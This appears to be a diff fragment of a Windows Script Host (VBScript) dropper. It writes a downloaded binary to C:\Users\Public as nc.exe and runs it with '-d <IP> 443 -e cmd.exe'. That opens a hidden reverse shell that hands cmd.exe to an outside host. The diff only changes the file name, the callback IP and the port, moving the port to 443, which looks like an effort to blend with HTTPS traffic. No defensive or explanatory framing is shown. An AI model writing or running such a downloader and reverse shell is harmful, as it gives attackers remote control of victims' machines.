@@ -16,7 +16,7 @@ with bStrm
     .type = 1 '//binary
     .open
     .write xHttp.responseBody
-    .savetofile "C:\Users\Public\nc64.exe", 2 '//overwrite
+    .savetofile "C:\Users\Public\nc.exe", 2 '//overwrite
 end with
 Set objShell20= CreateObject("WScript.Shell")
-objShell.Exec("C:\Users\Public\nc64.exe -d 10.6.26.69 4040 -e cmd.exe")
+objShell.Exec("C:\Users\Public\nc.exe -d 10.6.26.44 443 -e cmd.exe")
